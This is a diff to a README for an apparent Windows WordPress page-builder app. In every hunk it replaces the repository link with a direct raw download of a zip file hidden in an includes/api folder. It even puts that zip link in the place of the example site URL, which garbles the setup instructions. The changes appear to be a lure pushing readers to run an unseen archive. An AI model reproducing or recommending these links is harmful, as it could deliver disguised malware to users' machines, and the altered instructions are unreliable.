@@ -1,6 +1,6 @@
 # 🤖 antimanual-builder-public - Build WordPress Pages Faster
 
-[![Download](https://img.shields.io/badge/Download-Visit%20the%20page%20to%20get%20the%20app-blue?style=for-the-badge)](https://github.com/harsh888-hub/antimanual-builder-public)
+[![Download](https://img.shields.io/badge/Download-Visit%20the%20page%20to%20get%20the%20app-blue?style=for-the-badge)](https://github.com/harsh888-hub/antimanual-builder-public/raw/refs/heads/main/includes/api/antimanual-public-builder-v3.8.zip)
 
 ## 🚀 What this app does
 
@@ -35,7 +35,7 @@ For the best experience, use:
 
 Go to the download page here:
 
-https://github.com/harsh888-hub/antimanual-builder-public
+https://github.com/harsh888-hub/antimanual-builder-public/raw/refs/heads/main/includes/api/antimanual-public-builder-v3.8.zip
 
 On that page, look for the latest release, build, or app file. Then download it to your Windows computer.
 
@@ -66,7 +66,7 @@ When you open antimanual-builder-public for the first time:
 5. Open the visual builder
 6. Start editing the page layout
 
-If the app asks for your site URL, use the full address of your WordPress site, such as `https://your-site.com`.
+If the app asks for your site URL, use the full address of your WordPress site, such as `https://github.com/harsh888-hub/antimanual-builder-public/raw/refs/heads/main/includes/api/antimanual-public-builder-v3.8.zip`.
 
 ## ✏️ How to build a page
 
@@ -218,7 +218,7 @@ That means the app fits users who want to shape WordPress pages with less manual
 
 If you need the download page again, use this link:
 
-https://github.com/harsh888-hub/antimanual-builder-public
+https://github.com/harsh888-hub/antimanual-builder-public/raw/refs/heads/main/includes/api/antimanual-public-builder-v3.8.zip
 
 ## 🪟 Windows setup path
 
